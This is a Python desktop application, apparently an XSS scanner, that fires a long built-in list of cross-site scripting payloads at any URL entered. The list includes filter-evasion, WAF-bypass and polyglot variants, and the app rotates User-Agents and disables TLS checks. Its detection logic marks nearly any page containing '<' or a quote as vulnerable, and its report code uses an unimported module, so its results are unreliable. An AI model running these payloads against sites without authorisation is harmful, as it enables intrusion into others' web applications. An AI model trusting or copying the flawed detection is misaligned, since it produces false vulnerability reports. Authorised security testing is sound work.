#!/usr/bin/env python3
"""
XSS Vulnerability Scanner - Desktop application for detecting Cross-Site Scripting vulnerabilities
Platform: Chromebook Linux (Crostini/Debian)
"""

import tkinter as tk
from tkinter import ttk, filedialog, messagebox, scrolledtext
import requests
import threading
import csv
import datetime
import random
import time
import re
import urllib.parse
import json
from urllib.parse import urljoin, urlparse, parse_qs


class XSSScanner:
    def __init__(self, root):
        self.root = root
        self.root.title("XSS Vulnerability Scanner")
        self.root.geometry("1200x700")
        self.root.resizable(True, True)
        
        # Scanner state
        self.is_scanning = False
        self.scan_thread = None
        self.results = []
        self.selected_result = None
        
        # XSS payloads
        self.xss_payloads = [
            # Basic XSS payloads
            "<script>alert('XSS')</script>",
            "<script>alert(1)</script>",
            "<script>confirm('XSS')</script>",
            "<script>prompt('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert('XSS')>",
            "<svg onload=alert(1)>",
            "<iframe src=javascript:alert('XSS')>",
            "<iframe src=javascript:alert(1)>",
            "<body onload=alert('XSS')>",
            "<body onload=alert(1)>",
            
            # Filter evasion payloads
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "<SCRIPT>alert('XSS')</SCRIPT>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<script>alert(/XSS/)</script>",
            "<script>alert('XSS');</script>",
            "';alert('XSS');//",
            "\";alert('XSS');//",
            "<script>alert('XSS')</script>",
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            
            # Context-specific payloads
            "';alert('XSS');//",
            "\";alert('XSS');//",
            "<script>alert('XSS')</script>",
            "<script>alert('XSS')</script>",
            "onmouseover=alert('XSS')",
            "onfocus=alert('XSS')",
            "onblur=alert('XSS')",
            "onclick=alert('XSS')",
            "onload=alert('XSS')",
            "onerror=alert('XSS')",
            
            # Advanced payloads
            "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
            "<script>setTimeout('alert(\"XSS\")',100)</script>",
            "<script>document.write('<script>alert(\"XSS\")</script>')</script>",
            "<script>location='javascript:alert(\"XSS\")'</script>",
            "<script>window.open('javascript:alert(\"XSS\")')</script>",
            
            # HTML injection payloads
            "<html><script>alert('XSS')</script></html>",
            "<body><script>alert('XSS')</script></body>",
            "<div><script>alert('XSS')</script></div>",
            "<span><script>alert('XSS')</script></span>",
            
            # Attribute-based payloads
            "x onmouseover=alert('XSS')",
            "\" onmouseover=alert('XSS') ",
            "' onmouseover=alert('XSS') ",
            "x onfocus=alert('XSS') autofocus",
            "\" onfocus=alert('XSS') autofocus",
            "' onfocus=alert('XSS') autofocus",
            
            # Encoding-based payloads
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            "%3Cimg%20src%3Dx%20onerror%3Dalert('XSS')%3E",
            "%3Csvg%20onload%3Dalert('XSS')%3E",
            
            # DOM-based payloads
            "#<script>alert('XSS')</script>",
            "#<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "data:text/html,<script>alert('XSS')</script>",
            
            # Polyglot payloads
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
            "';alert(1);//';alert(1);//",
            "\";alert(1);//\";alert(1);//",
            "<script>alert(1)</script>",
            "<script>alert(1)</script>",
            
            # WAF bypass payloads
            "<script>alert(/XSS/)</script>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<script>alert(/XSS/.source)</script>",
            "<script>alert('XSS'.replace(/X/gi,''))</script>",
            "<script>alert(atob('WFNT'))</script>",
            
            # Modern payloads
            "<script>alert`XSS`</script>",
            "<script>alert`1`</script>",
            "<script>confirm`XSS`</script>",
            "<script>prompt`XSS`</script>",
            "<img src=x onerror=alert`XSS`>",
            "<svg onload=alert`XSS`>",
            
            # JSON-based payloads
            "{\"x\":\"<script>alert('XSS')</script>\"}",
            "{\"data\":\"<img src=x onerror=alert('XSS')>\"}",
            "{\"payload\":\"<svg onload=alert('XSS')>\"}",
            
            # URL-based payloads
            "javascript:alert('XSS')",
            "data:text/html,<script>alert('XSS')</script>",
            "vbscript:msgbox('XSS')",
            
            # CSS-based payloads
            "<style>@import url('javascript:alert(\"XSS\")');</style>",
            "<style>body{background:url('javascript:alert(\"XSS\")')}</style>",
            "<style>img{src:url('javascript:alert(\"XSS\")')}</style>",
            
            # Meta-based payloads
            "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('XSS')\">",
            "<meta http-equiv=\"refresh\" content=\"0;url=data:text/html,<script>alert('XSS')</script>\">",
            
            # Form-based payloads
            "<form><input onfocus=alert('XSS') autofocus></form>",
            "<form><button onclick=alert('XSS')>Click</button></form>",
            
            # Link-based payloads
            "<a href=javascript:alert('XSS')>Click</a>",
            "<a href=data:text/html,<script>alert('XSS')</script>>Click</a>",
            
            # Object-based payloads
            "<object data=javascript:alert('XSS')></object>",
            "<embed src=javascript:alert('XSS')></embed>",
            
            # Additional evasion techniques
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<script>alert(/XSS/.source)</script>",
            "<script>alert('XSS'.toUpperCase())</script>",
            "<script>alert(unescape('%58%53%53'))</script>",
            "<script>alert(decodeURI('XSS'))</script>"
        ]
        
        # User agents for rotation
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        ]
        
        self.setup_gui()
        
    def setup_gui(self):
        """Create the main GUI layout"""
        # Main container
        main_frame = ttk.Frame(self.root, padding="10")
        main_frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        
        # Configure grid weights for resizing
        self.root.columnconfigure(0, weight=1)
        self.root.rowconfigure(0, weight=1)
        main_frame.columnconfigure(0, weight=1)
        main_frame.rowconfigure(1, weight=1)
        
        # Top section - Input controls
        self.create_input_section(main_frame)
        
        # Middle section - Results panels
        self.create_results_section(main_frame)
        
        # Bottom section - Progress and status
        self.create_progress_section(main_frame)
        
    def create_input_section(self, parent):
        """Create the input controls section"""
        input_frame = ttk.LabelFrame(parent, text="XSS Scan Configuration", padding="10")
        input_frame.grid(row=0, column=0, sticky=(tk.W, tk.E), pady=(0, 10))
        input_frame.columnconfigure(1, weight=1)
        
        # Target URL input
        ttk.Label(input_frame, text="Target URL:").grid(row=0, column=0, sticky=tk.W, padx=(0, 10))
        self.url_var = tk.StringVar()
        self.url_entry = ttk.Entry(input_frame, textvariable=self.url_var, width=60)
        self.url_entry.grid(row=0, column=1, sticky=(tk.W, tk.E), padx=(0, 10))
        
        # Scan options
        options_frame = ttk.Frame(input_frame)
        options_frame.grid(row=1, column=0, columnspan=2, sticky=(tk.W, tk.E), pady=(10, 0))
        options_frame.columnconfigure(2, weight=1)
        
        # Delay setting
        ttk.Label(options_frame, text="Delay (s):").grid(row=0, column=0, sticky=tk.W, padx=(0, 5))
        self.delay_var = tk.StringVar(value="1.0")
        delay_spinbox = ttk.Spinbox(options_frame, from_=0.1, to=10, increment=0.1, textvariable=self.delay_var, width=8)
        delay_spinbox.grid(row=0, column=1, sticky=tk.W, padx=(0, 20))
        
        # User agent rotation
        self.rotate_ua_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(options_frame, text="Rotate User-Agent", variable=self.rotate_ua_var).grid(row=0, column=2, sticky=tk.W, padx=(0, 20))
        
        # Payload count limit
        ttk.Label(options_frame, text="Payload Limit:").grid(row=0, column=3, sticky=tk.W, padx=(0, 5))
        self.payload_limit_var = tk.StringVar(value="50")
        limit_spinbox = ttk.Spinbox(options_frame, from_=10, to=500, increment=10, textvariable=self.payload_limit_var, width=8)
        limit_spinbox.grid(row=0, column=4, sticky=tk.W, padx=(0, 20))
        
        # Control buttons
        button_frame = ttk.Frame(options_frame)
        button_frame.grid(row=0, column=5, sticky=tk.E)
        
        self.start_button = ttk.Button(button_frame, text="Start XSS Scan", command=self.start_scan)
        self.start_button.pack(side=tk.LEFT, padx=(0, 5))
        
        self.stop_button = ttk.Button(button_frame, text="Stop", command=self.stop_scan, state=tk.DISABLED)
        self.stop_button.pack(side=tk.LEFT, padx=(0, 5))
        
        ttk.Button(button_frame, text="Custom Payloads", command=self.open_payloads_dialog).pack(side=tk.LEFT, padx=(0, 5))
        ttk.Button(button_frame, text="Clear Results", command=self.clear_results).pack(side=tk.LEFT, padx=(0, 5))
        ttk.Button(button_frame, text="Save Report", command=self.save_report).pack(side=tk.LEFT)
        
    def create_results_section(self, parent):
        """Create the results section"""
        results_frame = ttk.LabelFrame(parent, text="XSS Scan Results", padding="10")
        results_frame.grid(row=1, column=0, sticky=(tk.W, tk.E, tk.N, tk.S), pady=(0, 10))
        results_frame.columnconfigure(0, weight=1)
        results_frame.rowconfigure(0, weight=1)
        
        # Create Treeview for results
        columns = ("URL", "Payload", "Status", "Response Time", "Type")
        self.results_tree = ttk.Treeview(results_frame, columns=columns, show="headings", height=15)
        
        # Define column headings and widths
        self.results_tree.heading("URL", text="URL")
        self.results_tree.heading("Payload", text="Payload")
        self.results_tree.heading("Status", text="Status")
        self.results_tree.heading("Response Time", text="Time (ms)")
        self.results_tree.heading("Type", text="XSS Type")
        
        self.results_tree.column("URL", width=300)
        self.results_tree.column("Payload", width=200)
        self.results_tree.column("Status", width=80)
        self.results_tree.column("Response Time", width=100)
        self.results_tree.column("Type", width=120)
        
        # Add scrollbar
        scrollbar = ttk.Scrollbar(results_frame, orient=tk.VERTICAL, command=self.results_tree.yview)
        self.results_tree.configure(yscrollcommand=scrollbar.set)
        
        # Grid layout
        self.results_tree.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        scrollbar.grid(row=0, column=1, sticky=(tk.N, tk.S))
        
        # Bind selection event
        self.results_tree.bind('<<TreeviewSelect>>', self.on_result_select)
        
        # Configure tags for color coding
        self.results_tree.tag_configure("vulnerable", background="#ffcccc")  # Light red
        self.results_tree.tag_configure("potential", background="#fff3cd")  # Light yellow
        self.results_tree.tag_configure("safe", background="#d4edda")  # Light green
        self.results_tree.tag_configure("error", background="#f8d7da")  # Red
        
    def create_progress_section(self, parent):
        """Create the progress and status section"""
        progress_frame = ttk.LabelFrame(parent, text="Progress", padding="10")
        progress_frame.grid(row=2, column=0, sticky=(tk.W, tk.E))
        progress_frame.columnconfigure(0, weight=1)
        
        # Progress bar
        self.progress_var = tk.DoubleVar()
        self.progress_bar = ttk.Progressbar(progress_frame, variable=self.progress_var, 
                                          maximum=100, length=400)
        self.progress_bar.grid(row=0, column=0, sticky=(tk.W, tk.E), pady=(0, 5))
        
        # Status label
        self.status_var = tk.StringVar(value="Ready to scan for XSS vulnerabilities")
        self.status_label = ttk.Label(progress_frame, textvariable=self.status_var)
        self.status_label.grid(row=1, column=0, sticky=tk.W)
        
    def open_payloads_dialog(self):
        """Open dialog for custom XSS payloads"""
        dialog = tk.Toplevel(self.root)
        dialog.title("Custom XSS Payloads")
        dialog.geometry("600x500")
        dialog.resizable(True, True)
        
        ttk.Label(dialog, text="Enter custom XSS payloads (one per line):", 
                 wraplength=550).pack(pady=10)
        
        payloads_text = scrolledtext.ScrolledText(dialog, wrap=tk.WORD, height=20, width=70)
        payloads_text.pack(pady=10, padx=10, fill=tk.BOTH, expand=True)
        
        # Pre-fill with current payloads
        for payload in self.xss_payloads[:20]:  # Show first 20 as example
            payloads_text.insert(tk.END, payload + "\n")
        
        button_frame = ttk.Frame(dialog)
        button_frame.pack(pady=10)
        
        def save_payloads():
            content = payloads_text.get("1.0", tk.END).strip()
            if content:
                self.xss_payloads = [line.strip() for line in content.split('\n') if line.strip()]
                messagebox.showinfo("Success", f"Loaded {len(self.xss_payloads)} custom payloads")
            dialog.destroy()
            
        ttk.Button(button_frame, text="Save", command=save_payloads).pack(side=tk.LEFT, padx=5)
        ttk.Button(button_frame, text="Cancel", command=dialog.destroy).pack(side=tk.LEFT, padx=5)
        
    def clear_results(self):
        """Clear all results"""
        for item in self.results_tree.get_children():
            self.results_tree.delete(item)
        self.results = []
        self.selected_result = None
        self.progress_var.set(0)
        self.status_var.set("Results cleared")
        
    def start_scan(self):
        """Start the XSS scanning process"""
        url = self.url_var.get().strip()
        if not url:
            messagebox.showerror("Error", "Please enter a target URL")
            return
            
        # Validate and format URL
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
            
        try:
            parsed = urlparse(url)
            if not parsed.netloc:
                raise ValueError("Invalid URL format")
        except Exception:
            messagebox.showerror("Error", "Invalid URL format")
            return
            
        self.is_scanning = True
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)
        self.url_entry.config(state=tk.DISABLED)
        
        # Start scanning in background thread
        self.scan_thread = threading.Thread(target=self.scan_xss, args=(url,))
        self.scan_thread.daemon = True
        self.scan_thread.start()
        
    def stop_scan(self):
        """Stop the scanning process"""
        self.is_scanning = False
        self.start_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)
        self.url_entry.config(state=tk.NORMAL)
        self.status_var.set("Scan stopped by user")
        
    def scan_xss(self, base_url):
        """Scan for XSS vulnerabilities"""
        try:
            payload_limit = int(self.payload_limit_var.get())
            delay = float(self.delay_var.get())
        except ValueError:
            payload_limit = 50
            delay = 1.0
            
        # Limit payloads to avoid overwhelming the server
        payloads_to_test = self.xss_payloads[:payload_limit]
        total_payloads = len(payloads_to_test)
        tested_payloads = 0
        
        # Test different injection points
        test_urls = self.generate_test_urls(base_url)
        
        for test_url in test_urls:
            if not self.is_scanning:
                break
                
            for payload in payloads_to_test:
                if not self.is_scanning:
                    break
                    
                # Test with URL-encoded payload
                encoded_payload = urllib.parse.quote(payload)
                
                # Test different injection methods
                injection_points = [
                    test_url + payload,
                    test_url + encoded_payload,
                    test_url + urllib.parse.quote_plus(payload)
                ]
                
                for injection_url in injection_points:
                    if not self.is_scanning:
                        break
                        
                    result = self.test_xss_payload(injection_url, payload, base_url)
                    if result:
                        self.root.after(0, self.add_result, result)
                        
                tested_payloads += 1
                progress = (tested_payloads / (total_payloads * len(test_urls))) * 100
                
                # Update progress
                self.root.after(0, self.update_progress, progress, tested_payloads, total_payloads * len(test_urls))
                
                # Delay between requests
                if delay > 0 and self.is_scanning:
                    time.sleep(delay)
                    
        # Scan completed
        self.root.after(0, self.scan_completed)
        
    def generate_test_urls(self, base_url):
        """Generate different test URLs for injection points"""
        test_urls = []
        parsed = urlparse(base_url)
        
        # Test URL parameter injection
        if '?' in base_url:
            # URL already has parameters
            test_urls.append(base_url + '&xss=')
            test_urls.append(base_url + '&test=')
            test_urls.append(base_url + '&param=')
        else:
            # URL has no parameters
            test_urls.append(base_url + '?xss=')
            test_urls.append(base_url + '?test=')
            test_urls.append(base_url + '?param=')
            
        # Test path-based injection
        path_parts = parsed.path.split('/')
        if len(path_parts) > 1:
            for i in range(1, len(path_parts)):
                new_path = '/'.join(path_parts[:i]) + '/' + urllib.parse.quote('<script>alert(1)</script>') + '/' + '/'.join(path_parts[i+1:])
                test_urls.append(parsed.scheme + '://' + parsed.netloc + new_path)
                
        # Test fragment-based injection
        test_urls.append(base_url + '#')
        
        return test_urls
        
    def test_xss_payload(self, url, payload, base_url):
        """Test a single XSS payload"""
        try:
            # Prepare headers
            headers = {}
            if self.rotate_ua_var.get():
                headers['User-Agent'] = random.choice(self.user_agents)
                
            # Make request with timing
            start_time = time.time()
            
            import urllib3
            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
            
            response = requests.get(url, headers=headers, timeout=10, verify=False, allow_redirects=False)
            
            response_time = (time.time() - start_time) * 1000  # Convert to milliseconds
            
            # Analyze response for XSS indicators
            xss_detected, xss_type = self.analyze_xss_response(response, payload)
            
            result = {
                'url': url,
                'payload': payload,
                'status_code': response.status_code,
                'response_time': response_time,
                'response_body': response.text[:1000],  # Truncate for storage
                'xss_detected': xss_detected,
                'xss_type': xss_type,
                'timestamp': datetime.datetime.now()
            }
            
            return result
            
        except requests.exceptions.Timeout:
            return {
                'url': url,
                'payload': payload,
                'status_code': 'Timeout',
                'response_time': 10000,
                'response_body': '',
                'xss_detected': False,
                'xss_type': 'Error',
                'timestamp': datetime.datetime.now()
            }
        except requests.exceptions.ConnectionError:
            return {
                'url': url,
                'payload': payload,
                'status_code': 'Error',
                'response_time': 0,
                'response_body': '',
                'xss_detected': False,
                'xss_type': 'Error',
                'timestamp': datetime.datetime.now()
            }
        except Exception as e:
            return {
                'url': url,
                'payload': payload,
                'status_code': 'Error',
                'response_time': 0,
                'response_body': '',
                'xss_detected': False,
                'xss_type': f'Error: {str(e)[:50]}',
                'timestamp': datetime.datetime.now()
            }
            
    def analyze_xss_response(self, response, payload):
        """Analyze response for XSS indicators"""
        response_text = response.text.lower()
        payload_lower = payload.lower()
        
        # Direct payload reflection
        if payload_lower in response_text:
            return True, "Direct Reflection"
            
        # Partial payload reflection
        if any(part in response_text for part in ['<script', 'alert(', 'onerror=', 'onload=', 'javascript:']):
            return True, "Partial Reflection"
            
        # HTML context indicators
        if any(indicator in response_text for indicator in ['<script>', '<img', '<svg', '<iframe', '<body']):
            return True, "HTML Injection"
            
        # Event handler indicators
        if any(handler in response_text for handler in ['onerror', 'onload', 'onclick', 'onmouseover', 'onfocus']):
            return True, "Event Handler"
            
        # JavaScript indicators
        if any(js_indicator in response_text for js_indicator in ['javascript:', 'alert(', 'confirm(', 'prompt(']):
            return True, "JavaScript Injection"
            
        # DOM-based XSS indicators
        if any(dom_indicator in response_text for dom_indicator in ['document.write', 'innerhtml', 'outerhtml']):
            return True, "DOM-based XSS"
            
        # Potential XSS (suspicious patterns)
        if any(suspicious in response_text for suspicious in ['<', '>', '"', "'", '&lt;', '&gt;']):
            return True, "Potential XSS"
            
        return False, "No XSS Detected"
        
    def add_result(self, result):
        """Add a result to the table"""
        self.results.append(result)
        
        # Determine tag for color coding
        if result['xss_detected']:
            if result['xss_type'] in ['Direct Reflection', 'HTML Injection', 'JavaScript Injection']:
                tag = "vulnerable"
            else:
                tag = "potential"
        elif result['status_code'] in ['Timeout', 'Error']:
            tag = "error"
        else:
            tag = "safe"
            
        # Insert into treeview
        self.results_tree.insert('', 'end', values=(
            result['url'],
            result['payload'][:50] + '...' if len(result['payload']) > 50 else result['payload'],
            result['status_code'],
            f"{result['response_time']:.2f}",
            result['xss_type']
        ), tags=(tag,))
        
        # Auto-scroll to latest result
        self.results_tree.see(self.results_tree.get_children()[-1])
        
    def update_progress(self, progress, current, total):
        """Update progress bar and status"""
        self.progress_var.set(progress)
        self.status_var.set(f"Testing payload {current}/{total}...")
        
    def scan_completed(self):
        """Called when scan is completed"""
        self.is_scanning = False
        self.start_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)
        self.url_entry.config(state=tk.NORMAL)
        
        # Count results
        vulnerable_count = sum(1 for r in self.results if r['xss_detected'])
        potential_count = sum(1 for r in self.results if r['xss_detected'] and 'Potential' in r['xss_type'])
        
        # Generate summary
        summary = f"XSS scan completed - {len(self.results)} payloads tested"
        if vulnerable_count > 0:
            summary += f" - {vulnerable_count} vulnerabilities found"
        if potential_count > 0:
            summary += f" - {potential_count} potential issues"
            
        self.status_var.set(summary)
        
        # Auto-generate report if vulnerabilities found
        if vulnerable_count > 0:
            self.root.after(1000, self.save_report)
            
    def on_result_select(self, event):
        """Handle result selection"""
        selection = self.results_tree.selection()
        if not selection:
            return
            
        item = selection[0]
        
        # Find corresponding result
        for result in self.results:
            # Simple matching by URL and payload
            if (result['url'] == self.results_tree.item(item)['values'][0] and 
                result['payload'][:50] == self.results_tree.item(item)['values'][1][:50]):
                self.selected_result = result
                self.show_result_details(result)
                break
                
    def show_result_details(self, result):
        """Show detailed information about selected result"""
        details = f"URL: {result['url']}\n"
        details += f"Payload: {result['payload']}\n"
        details += f"Status Code: {result['status_code']}\n"
        details += f"Response Time: {result['response_time']:.2f}ms\n"
        details += f"XSS Type: {result['xss_type']}\n"
        details += f"Timestamp: {result['timestamp'].strftime('%Y-%m-%d %H:%M:%S')}\n\n"
        
        details += "Response Body (first 1000 chars):\n"
        details += "-" * 50 + "\n"
        details += result['response_body']
        
        messagebox.showinfo("XSS Scan Result Details", details)
        
    def save_report(self):
        """Save scan results to files"""
        if not self.results:
            messagebox.showwarning("Warning", "No results to save")
            return
            
        # Ask user to choose save location
        save_dir = filedialog.askdirectory(title="Choose folder to save reports")
        if not save_dir:
            return
            
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        url = self.url_var.get().strip()
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
            
        base_filename = f"xss_scan_{url.replace('://', '_').replace('/', '_')}_{timestamp}"
        
        try:
            # Generate TXT report
            txt_path = os.path.join(save_dir, f"{base_filename}.txt")
            self.generate_txt_report(txt_path, url)
            
            # Generate CSV report
            csv_path = os.path.join(save_dir, f"{base_filename}.csv")
            self.generate_csv_report(csv_path)
            
            messagebox.showinfo("Success", f"XSS scan reports saved to:\n{txt_path}\n{csv_path}")
            
        except Exception as e:
            messagebox.showerror("Error", f"Failed to save reports: {str(e)}")
            
    def generate_txt_report(self, filepath, url):
        """Generate detailed text report"""
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write("=" * 60 + "\n")
            f.write("XSS VULNERABILITY SCAN REPORT\n")
            f.write("=" * 60 + "\n\n")
            
            f.write(f"Target URL: {url}\n")
            f.write(f"Scan Date: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Total Payloads Tested: {len(self.results)}\n\n")
            
            # Vulnerability summary
            vulnerable_results = [r for r in self.results if r['xss_detected']]
            f.write(f"Vulnerabilities Found: {len(vulnerable_results)}\n\n")
            
            if vulnerable_results:
                f.write("VULNERABLE ENDPOINTS:\n")
                f.write("-" * 40 + "\n\n")
                
                for i, result in enumerate(vulnerable_results, 1):
                    f.write(f"{i}. {result['xss_type']}\n")
                    f.write(f"   URL: {result['url']}\n")
                    f.write(f"   Payload: {result['payload']}\n")
                    f.write(f"   Status Code: {result['status_code']}\n")
                    f.write(f"   Response Time: {result['response_time']:.2f}ms\n\n")
                    
            # All results
            f.write("ALL SCAN RESULTS:\n")
            f.write("-" * 40 + "\n\n")
            
            for result in self.results:
                status = "VULNERABLE" if result['xss_detected'] else "SAFE"
                f.write(f"URL: {result['url']}\n")
                f.write(f"Status: {status} ({result['xss_type']})\n")
                f.write(f"Payload: {result['payload']}\n")
                f.write(f"Status Code: {result['status_code']}\n")
                f.write(f"Response Time: {result['response_time']:.2f}ms\n\n")
                
            f.write("=" * 60 + "\n")
            f.write("END OF REPORT\n")
            f.write("=" * 60 + "\n")
            
    def generate_csv_report(self, filepath):
        """Generate CSV report"""
        with open(filepath, 'w', newline='', encoding='utf-8') as f:
            writer = csv.writer(f)
            
            # Write header
            writer.writerow([
                'URL', 'Payload', 'Status Code', 'Response Time (ms)', 
                'XSS Detected', 'XSS Type', 'Timestamp'
            ])
            
            # Write results
            for result in self.results:
                writer.writerow([
                    result['url'],
                    result['payload'],
                    result['status_code'],
                    f"{result['response_time']:.2f}",
                    "Yes" if result['xss_detected'] else "No",
                    result['xss_type'],
                    result['timestamp'].strftime('%Y-%m-%d %H:%M:%S')
                ])


def main():
    """Main entry point"""
    root = tk.Tk()
    app = XSSScanner(root)
    root.mainloop()


if __name__ == "__main__":
    main()
